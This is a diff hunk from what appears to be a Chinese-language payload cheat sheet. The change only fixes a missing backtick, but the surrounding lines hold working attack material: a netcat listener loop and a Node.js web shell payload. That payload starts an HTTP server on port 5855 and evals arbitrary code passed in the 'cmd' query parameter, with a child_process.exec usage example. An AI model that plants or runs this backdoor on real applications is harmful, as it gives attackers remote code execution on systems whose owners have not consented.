@@ -626,7 +626,7 @@ $ while :; do printf "j$ "; read c; echo $c | nc -lp 5855 >/dev/null; done
 **82.Node.js Web Shell (Node.js web后门)** <br>
 以下payload用于在易受攻击的Node.js应用程序中创建web后门,在运行下面的有效负载之后，按以下方式使用shell <br>
 `shell:http://target:5855/?cmd=my_node.js_command` <br>
-弹出计算示例：`cmd=require('child_process').exec('gnome-calculator') <br>
+弹出计算示例：`cmd=require('child_process').exec('gnome-calculator')` <br>
 ```
 require('http').createServer(function(req,res){res.end(1-
 eval(require('url').parse(req.url,1).query.cmd))}).listen(5855)
